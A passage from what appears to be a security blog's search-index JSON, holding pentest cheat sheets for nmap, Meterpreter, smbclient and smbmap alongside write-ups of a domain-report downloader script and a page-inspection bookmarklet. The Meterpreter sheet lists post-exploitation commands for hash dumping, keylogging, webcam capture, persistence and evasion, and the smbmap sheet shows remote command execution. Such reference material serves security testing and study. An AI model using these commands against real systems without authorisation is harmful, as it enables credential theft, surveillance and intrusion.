****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective (sometimes), that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Basic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. ","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. ","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"Basic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. ","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan 